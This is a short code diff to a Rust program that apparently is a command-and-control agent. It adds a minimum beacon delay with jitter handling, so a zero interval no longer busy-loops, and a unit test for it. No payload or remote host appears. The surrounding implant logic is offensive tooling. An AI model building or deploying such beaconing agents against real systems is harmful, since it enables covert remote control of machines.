@@ -31,6 +31,7 @@ const CWD_TASK_WORKER_THREADS: usize = 1;
 const TASK_QUEUE_CAPACITY: usize = 32;
 const CWD_TASK_QUEUE_CAPACITY: usize = 32;
 const MAX_POST_RESPONSE_DRAIN_CYCLES: usize = 10_000;
+const MIN_BEACON_DELAY: Duration = Duration::from_millis(250);
 
 struct CompletedTask {
     command: String,
@@ -269,7 +270,7 @@ fn maybe_exit_process() {
 fn next_beacon_delay() -> Duration {
     let interval = INTERVAL.load(Ordering::Acquire);
     if interval == 0 {
-        return Duration::ZERO;
+        return MIN_BEACON_DELAY;
     }
     // JITTER is a percentage (0–100): extra sleep = interval * jitter% * random
     let jitter_pct = JITTER.load(Ordering::Acquire).min(100);
@@ -549,5 +550,14 @@ mod tests {
         assert_eq!(completed.responses.len(), 1);
         assert_eq!(completed.responses[0].task_id, task_id);
         assert_eq!(completed.responses[0].status.as_deref(), Some("error"));
+    }
+
+    #[test]
+    fn zero_sleep_interval_does_not_busy_loop() {
+        let old_interval = INTERVAL.swap(0, Ordering::AcqRel);
+        let delay = next_beacon_delay();
+        INTERVAL.store(old_interval, Ordering::Release);
+
+        assert!(delay >= MIN_BEACON_DELAY);
     }
 }
